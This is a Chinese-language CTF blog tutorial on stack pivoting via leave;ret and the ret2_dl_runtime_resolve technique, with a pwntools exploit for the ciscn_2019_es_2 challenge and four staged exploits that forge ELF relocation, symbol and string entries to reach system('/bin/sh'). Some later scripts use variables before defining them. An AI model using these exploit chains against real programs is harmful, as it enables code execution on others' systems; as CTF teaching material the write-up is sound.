---
title: 栈迁移+ret2_dl_runtime_reslove
date: 2023-07-13 14:05:54
tags: [Pwn,Stack,ret2_dl_runtime_resolve]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dlruncover.jpg"
categories: [Study]
---



在之前的博客中，我们介绍了[延迟绑定机制](https://wutong01304.github.io/2023/07/07/ret2libc/) 。我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的，如果我们可以控制相应的参数及其对应地址内容，就可以控制解析的函数了。

在介绍_dl_runtime_resolve之前，我们先介绍栈迁移

# 一、栈迁移

## 1.1 介绍

我们在进行栈溢出的时候，利用的gadgets往往比较长，此时会出现栈溢出空间大小不足的问题。而栈迁移就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行返回导向编程（ROP）。

接下来我们介绍一下利用 leave ret 进行栈迁移到 bss 段的原理。

leave_ret 在函数返回时本身就会执行（如下）。leave 的作用相当于 mov esp, ebp; pop ebp，ret 的作用是相当于 pop eip

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le1.png?x-oss-process=style/watermark" style="zoom:80%;" />

我们值得在调用函数完毕返回后，会执行mov esp ,ebp；pop ebp的操作，因此当我们将leave_ret 填在返回地址后，这个操作相当于会被执行两次。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le2.png?x-oss-process=style/watermark" style="zoom:80%;" />

正常情况下执行这个操作

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le3.png?x-oss-process=style/watermark" style="zoom:80%;" />

但是如果我们将EBP地址变成我们构造的虚假EBP地址（bss段地址），返回地址填入leave_re，此时第一次执行：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le4.png?x-oss-process=style/watermark" style="zoom:80%;" />

然后程序转到leave_ret执行，也就是再执行一次：mov esp ,ebp；pop ebp。此时若bss 段是我们构造好的另一个地址，比如bss+16的话：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le5.png?x-oss-process=style/watermark" style="zoom:80%;" />

此时，bss段就被我们构造成了一个虚假的栈，esp和ebp会在这里移动并执行指令，若我们将函数地址写入（比如write）,此时再执行leave_ret的后半段指令（ret：pop eip），就会去执行这个函数。

## 1.2 例题

题目：https://buuoj.cn/challenges#ciscn_2019_es_2

使用32位IDA打开，查看关键的函数vul，函数里创建了一个长度为0x28的buf字符串，read函数最大可输入长度为0x30，只可以溢出8个字节，ebp占四个字节，然后就是返回地址4个字节。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le6.png?x-oss-process=style/watermark)

函数列表里有system函数，但由于我们能溢出的字符串太短，没办法给system函数构造参数，所以使用栈迁移。

首先我们通过第一次溢出，使程序打印出当前EBP存储的地址。之所以可以打印的原理是，read读入s长度有0x30字节，如果我们输入0x28个字节，read函数就会多读8个字节，也就会将ebp的内容读取进去，而printf函数执行时会将0x30字节的数据都打印，即ebp的内容也会被打印出来。

首先，我们通过调试查了打印出来的ebp内容 距离当前ebp的偏移：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le7.png?x-oss-process=style/watermark)

如图所示，我们可以知道 read函数的ebp0 距离 printf函数ebp1 之间为0x10的偏移：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le8.png?x-oss-process=style/watermark" style="zoom:80%;" />

然后我们通过第二次溢出，将构造好的system函数输入栈，并将EBP填入我们构造的虚假EBP，将返回地址填入leave_ret进行栈迁移：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le10.png?x-oss-process=style/watermark" style="zoom:80%;" />

如上图所示，我们将虚假的EBP指向read函数栈帧开始的地方，也就是leak_addr - 0x10 -0x28，然后再输入构造好的system函数。这样程序执行leave_ret的时候就会回到read栈帧开始的地方，进而去执行system。值得注意的是，由于leve_ret的后半段是pop ebp指令，然后才是pop eip指令，因此我们需要填入四字节垃圾数据，使得它可以正确执行system。

使用如下执行寻找leave ret进行栈迁移：

```shell
ROPgadget --binary ciscn_2019_es_2 --only 'leave|ret'
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le9.png?x-oss-process=style/watermark)

完整exp：

```python
from pwn import *
p=remote('node4.buuoj.cn',27971)
sys_addr = 0x08048400
leave_ret = 0x080484b8
payload ='a'*0x20+'bbbbbbbb' #输入0x28个字节
p.send(payload)
p.recvuntil('bbbbbbbb')
leak_addr = u32(p.recv(4))#接收打印出来的ebp地址
print "0x%x"  %leak_addr
payload2 =('aaaa'+p32(sys_addr)+'bbbb'+p32(leak_addr-0x28)+'/bin/sh\x00').ljust(0x28,'a')
payload2+=p32(leak_addr-0x38)+p32(leave_ret)
p.sendline(payload2)
p.interactive()
```

获取shell成功：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/le11.png?x-oss-process=style/watermark" style="zoom:80%;" />

# 二、基本原理

参考链接：[Advanced ROP (yuque.com)](https://www.yuque.com/hxfqg9/bin/erh0l7)  

_dl_runtime_resolve(link_map_obj, reloc_index)是进行延迟绑定的时候重定位的，在第一次调用函数的时候，它会去寻找函数的真实地址，过程如下：

1. 首先使用 link_map 访问 .dynamic，分别取出 .dynstr、.dynsym、.rel.plt 的地址
2. .rel.plt + 参数 reloc_arg，求出当前函数的重定位表项 Elf32_Rel 的指针，记作 rel
3. rel 的 r_info >> 8 作为 .dynsym 的下标，求出当前函数的符号表项 Elf32_Sym 的指针，记作 sym
4. .dynstr + sym -> st_name 得出符号名字符串指针
5. 在动态链接库查找这个函数地址，并且把地址赋值给 *rel -> r_offset，即 GOT 表
6. 调用这个函数

接下来，通过一个例子详细了解这个过程：

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

使用如下命令进行编译：

```shell
gcc -o main -m32 -fno-stack-protector bof.c
```

然后用gdb进行调试：

利用strlen函数查看。反汇编找到调用地址：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d1.png?x-oss-process=style/watermark)

在strlen函数也就是0x80483b0下断点：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d2.png?x-oss-process=style/watermark)

si单步步入：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d3.png?x-oss-process=style/watermark)

此时，程序 jmp 到0x804a014，查看指令，发现其跳转的就是下一条指令：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d4.png?x-oss-process=style/watermark)

继续si单步进入，先进入到全局偏移表，在进入到dl_runtime_resolve。在这之前，程序 push 了两个参数，一个是 0x10，一个是 0x804a004 里面的内容

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d5.png?x-oss-process=style/watermark)

查看里面的内容，存了一个地址 0xf7ffd940 ，这个地址就是 **link_map** 的地址。通过这个地址就可以找到 **.dynamic** 的地址，就是第三个 0x8049f14。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d6.png?x-oss-process=style/watermark)

通过0x8049f14可以找到**.dynstr、 .dynsym、 .rel.plt** 的地址。

- .dynstr 的地址是 .dynamic + 0x44 -> 0x08048278
- .dynsym 的地址是 .dynamic + 0x4c -> 0x080481d8
- .rel.plt 的地址是 .dynamic + 0x84 -> 0x08048330

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d7.png?x-oss-process=style/watermark)

.rel.plt 的地址加上参数 reloc_arg，即 0x08048330 + 0x10 -> 0x8048340。找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d8.png?x-oss-process=style/watermark)

通过这个 rel 可以得到以下信息

- r_offset = 0x0804a014（第一个值）   //指向GOT表的指针
- r_info = 0x00000407（第二个值）

将r_info>>8，即0x00000407>>8 = 4作为.dynsym中的下标，这里的 ">>" 意思是右移。
我们来到 0x080481d8（上面找到的那个 .dynsym 的地址）看一下，在标号为 4 的地方，就是函数名称的偏移：name_offset，即下图中标号为4的地址0x08048218，其偏移为0x20。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d9.png?x-oss-process=style/watermark)

.dynstr + name_offset 就是这个函数的符号名字符串 st_name。即0x08048278 + 0x20 -> 0x8048298‬

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d10.png?x-oss-process=style/watermark)

总结：

1. dl_runtime_resolve 需要两个参数，一个是 reloc_arg（0x10），就是函数自己的 plt 表项 push 的内容，一个是link_map（0xf7ffd940），这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址（0x8049f14）
2. 而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址。
3. .rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info
4. 将 r_info>>8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset
5. .dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名
6. 在动态链接库里面找这个函数的地址，赋值给 *rel->r_offset，也就是 GOT 表就完成了一次函数的动态链接

流程图（图片截取于：https://www.yuque.com/hxfqg9/bin/erh0l7?inner=nRZJW）：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d11.png" style="zoom:80%;" />

# 三、攻击原理

我们知道，dl_runtime_resolve 是通过最后的 st_name 来确定执行那一个函数的，也就是说，可以通过控制这个地址的内容来执行任意函数，比如：system。而 reloc_arg 是我们可控的，我们需要把 reloc_arg 可控间接控制 st_name。我们可以在一段地址上伪造一段结构直接修改 .dynstr。

## 3.1 **reloc_arg**

利用reloc_arg来调用 write 函数，就是跳到plt0地址，获取link_map的地址，然后输入reloc_arg其实便可以调用write函数了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d12.png)

具体来说，利用 plt[0] （link_map）的相关指令，即公共 plt 表项的第一个地址 link_map 以及跳转到 dl_resolve 函数中解析的指令。如图所示。plt[0]就是0x8048380，即公共偏移表的位置，0x804a004中存放了link_map的地址。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d13.png?x-oss-process=style/watermark)

plt0的地址我们可以通过**elf.get_section_by_name(’.plt’).header.sh_addr **找到，但relloc_arg需要我们计算出来。.plt 保存了 relloc_arg 和 got 的地址，而 .plt.rel+relloc_arg 的第一个值 r_offset = 0x0804a014 指向 got 表。对照下图1 strlen的jmp 0x804a014地址（relloc_arg = 0x10）和图2的第2行(0x8048330+0x10=0x8048340)的第一个值0x804a014。也就是说.plt与.plt.rel一一对应。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d14.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d15.png?x-oss-process=style/watermark)

而.plt从结构体下标从1开始，.rel.plt的结构体下标是从0开始的。wrie.plt地址0x80483d0，对应.rel.plt的地址是0x8048350，(write.plt-plt0)/16=(0x80483d0-0x8048380)/16=5，得到write在.plt的下标再减1可得到在.rel.plt的下标.rel.plt[4]，而relloc_arg则在如上基础乘8，4*8=0x20。即relloc_arg=((elf.plt[‘write’] - plt0) / 16 - 1) *8

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d16.png?x-oss-process=style/watermark)

exp1:

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
stack_size = 0x800 #普遍是这个地址
base_stage = bss_addr + stack_size 
rop.raw('a' * offset)#在ROP链中填充offset个a
rop.read(0, base_stage, 100)#相当于call read，读取100个字节到base_stage，即第2段rop
rop.migrate(base_stage)#会将程序流程又转到base_stage
r.sendline(rop.chain()) #第一段栈迁移
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr#会把找到plt[0]的地址十进制形式给plt0
write_index = (elf.plt['write'] - plt0) / 16 - 1
write_index *= 8#得到push的那一个write@plt的0x20也就是32
rop.raw(plt0)#将第2段rop换成这个。会转到plt0执行 
rop.raw(write_index)#write的relloc_arg，控制程序执行write函数
rop.raw('bbbb')#plt0执行完毕，调用write，此时这里就会成为write的虚假返回地址
rop.raw(1) #write的参数
rop.raw(base_stage + 80)#将bin/sh写入到base_stage + 80
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))#填充到100字符
r.sendline(rop.chain())#第二段rop
r.interactive()
```

成功打印 bin/sh 就是执行成功了。

## 3.2 Elf32_Rel

尝试伪造一个Elf32_Rel结构体。同样控制 dl_resolve 函数中的 reloc_arg参数，不过这次控制其指向我们伪造的 write 重定位项，即r_offset，r_info。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d17.png)

使用 readeld -r mian 命令，可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d18.png?x-oss-process=style/watermark)

正常来说，我们是用reloc_arg+.rel.plt定位到Elf32_Rel的，在_dlresolve函数没有做边界检查的前提下，可以将r_offset、r_info的地址写入到.bss段上，伪造Elf32_Rel。此时需要使reloc_arg+.rel.plt的地址为r_offset、r_info（记为fake_reloc）的地址。因此我们要构造的reloc_arg（记为偏移index_offset）为：index_offset+.rel.plt=fake_reloc。base_stage的内容如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d19.png?x-oss-process=style/watermark)

此时，fake_reloc=base_stage+24= index_offset+.rel.plt，因此index_offset= base_stage + 24 - rel_plt。

exp2:

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
stack_size = 0x800 #普遍是这个地址
base_stage = bss_addr + stack_size 
rop.raw('a' * offset)#在ROP链中填充offset个a
rop.read(0, base_stage, 100)#相当于call read，读取100个字节到base_stage，即第2段rop
rop.migrate(base_stage)#会将程序流程又转到base_stage
r.sendline(rop.chain()) #第一段栈迁移
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr #获得plt0的地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr#获得.rel.plt的地址
index_offset = base_stage + 24 - rel_plt #假的偏移，使reloc_arg+.rel.plt指向构造的Elf32_Rel
write_got = elf.got['write'] #也就是Elf32_Rel里的r_offset
r_info = 0x607 # Elf32_Rel里的r_info
fake_reloc = p32(write_got) + p32(r_info)#假的Elf32_Rel
rop.raw(plt0)
rop.raw(index_offset)#会跳转到我们的 fake_reloc
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))#调用write写入bin/sh
rop.raw(fake_reloc)#Elf32_Rel写入bss段
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))#填充到100字符
r.sendline(rop.chain())#第2段rop
r.interactive()
```

成功打印 bin/sh 就是执行成功了。

## **3.3 .dynsym**

上一节中，我们控制了Elf32_Rel。如果之后想调用system函数，那么r_info和r_offset肯定不能通过我们使用readelf自己读出。

r_offset用elf.got就可以得到，但r_info不能，那么下一步便要在.bss段上伪造一个dynsym，然后通过构造的dynsym反推出新的r_info。

dynsym结构：

```c
typedef struct
{
    Elf32_Word    st_name;//符号名
    Elf32_Addr    st_value;
    Elf32_Word    st_size;
    unsigned char st_info;
    unsigned char st_other;
    Elf32_Section st_shndx;
}Elf32_Sym
```

首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道write 对应的符号在符号表的下标为 0x607>>8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。**name_offset=0x4c，st_value=0，st_size=0，st_info=0x12**

使用如下命令查看 .dynsym

```shell
objdump -s -EL -j .dynsym main
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d21.png?x-oss-process=style/watermark" style="zoom:80%;" />

我们将fake_dynsym放入bss段，放到fake_relloc后面，因此fake_dynsym的地址也就是base_stage+32，考虑到对齐问题（下面介绍），需要在fake_dynsym前面填充数个a（假设填充align个）。即fake_dynsym的地址：fake_dynsym_addr = align +base_stage + 32。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d22.png?x-oss-process=style/watermark)

关于对齐问题：因为dynsym大小为16字节，所以程序要找一个函数的dynsym节则要16个字节16个字节的找。base_stage + 32可能在任意位置，但这样是不行的，它的结构体只能从开头开始。因此我们需要地址对齐。在伪造dynsym前加上一段垃圾数据：align = 0x10-((base_stage+32-dynsym)&0xf)。

于是函数下标dynsym_index =(fake_sym_addr-dynsym)/16。而r_info是0x?07的形式， 07代表的是导入函数的意思，因此要推出r_info，只要将index_dynsym左移八位，再加上07标识符就可以了。因为bin(index_dynsym<<8)的后四位均为0，所以与上0x7实际上就相当于加0x7。r_info = (index_dynsym << 8) | 0x7。
程序在执行时，会在bss段（也就是我们写入的Elf32_Rel和 fake_dynsym）寻找相关地址，也就是说，r_offset、r_info、.dynsym都由我们控制，即控制了name_offset。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d23.png)

exp3：

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
stack_size = 0x800 #普遍是这个地址
base_stage = bss_addr + stack_size 
rop.raw('a' * offset)#在ROP链中填充offset个a
rop.read(0, base_stage, 100)#相当于call read，读取100个字节到base_stage，即第2段rop
rop.migrate(base_stage)#会将程序流程又转到base_stage
r.sendline(rop.chain()) #第一段栈迁移
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr #获得plt0的地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr#获得.rel.plt的地址
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr#获得.dynsym的地址
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) #地址对齐 #得到write的dynsym索引号
fake_sym_addr = align + base_stage + 32 #假的构造的dynsym的地址
index_dynsym = (fake_sym_addr - dynsym) / 0x10  #得到write的dynsym索引号
fake_write_sym = flat([0x4c, 0, 0, 0x12])# 这就是fake_dynsym，0x4c就是name_offset
index_offset = base_stage + 24 - rel_plt#计算fake_reloc偏移
write_got = elf.got['write']#计算r_offse
r_info = (index_dynsym << 8) | 0x7#计算 r_info 
fake_write_reloc = flat([write_got, r_info])#和p32(write_got)+p32(r_info)一样
rop.raw(plt0)
rop.raw(index_offset)#会跳转到我们的 fake_reloc
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))#调用write写入bin/sh
rop.raw(fake_write_reloc)  #Elf32_Rel写入bss段
rop.raw('a' * align)  
rop.raw(fake_write_sym)  #将fake_dynsym写入bss段，找name_offset用到
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))#填充到100字符
r.sendline(rop.chain())#第2段rop
r.interactive()

```

成功打印 bin/sh 就是执行成功了

## 3.4 .dynstr

我们知道.dynstr+name_offset=std_name，name_offset在上节已经由我们控制，只要接下来伪造.dynstr，就可以控制std_name（函数名），让dlresolve去寻找我们想要执行的函数

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d24.png)

以利用write函数为例，构造write函数的字符串“write\x00”（.dynstr中每一段字符串都以\x00结尾）。将所需字符写入bss段，那应该写入什么地址呢？我们知道.dynstr+name_offset=st_name，即name_offset = st_name - .dynstr。将write\x00写入栈：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d25.png?x-oss-process=style/watermark)

根据栈结构，st_name地址(write\x00)距离name_offset（fake_ dynsym）有0x10的距离。

 name_offset = align+ base_stage + 48 - .dynstr = fake_dynsym_addr + 0x10 – dynstr.

exp4:

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
stack_size = 0x800 #普遍是这个地址
base_stage = bss_addr + stack_size 
rop.raw('a' * offset)#在ROP链中填充offset个a
rop.read(0, base_stage, 100)#相当于call read，读取100个字节到base_stage，即第2段rop
rop.migrate(base_stage)#会将程序流程又转到base_stage
r.sendline(rop.chain()) #第一段栈迁移
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr #获得plt0的地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr#获得.rel.plt的地址
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr#获得.dynsym的地址
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr #获取.dynstr地址
align = 0x10 - ((fake_dynsym_addr - dynsym) & 0xf)  #地址对齐
fake_sym_addr = align + base_stage + 32 #假的构造的dynsym的地址
index_dynsym = (fake_dynsym_addr - dynsym) / 0x10 #得到write的dynsym索引号
st_name = fake_dynsym_addr + 0x10 - dynstr# 假的st_name所在地址
fake_dynsym = flat([st_name, 0, 0, 0x12])# 假的dynsym
index_offset = base_stage + 24 - rel_plt #得到write的dynsym索引号
write_got = elf.got['write']#计算r_offset
r_info = (index_dynsym << 8) | 0x7 #计算r_info
fake_write_reloc = flat([write_got, r_info])#假的reloc
rop.raw(plt0)
rop.raw(index_offset)#转到dlresolve执行
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))#写入bin/sh
rop.raw(fake_write_reloc)   #写入reloc
rop.raw('a' * align)  
rop.raw(fake_dynsym)  #写入dynsym
rop.raw('write\x00')  #写入st_name字符 可以换成system函数：rop.raw('system\x00')
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))#填充到100字符
r.sendline(rop.chain())#第2段rop
r.interactive()
```

## **3.5 system**

由于dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。因此我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。即rop.raw('system\x00')：

成功获取shell：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/dend.png?x-oss-process=style/watermark)
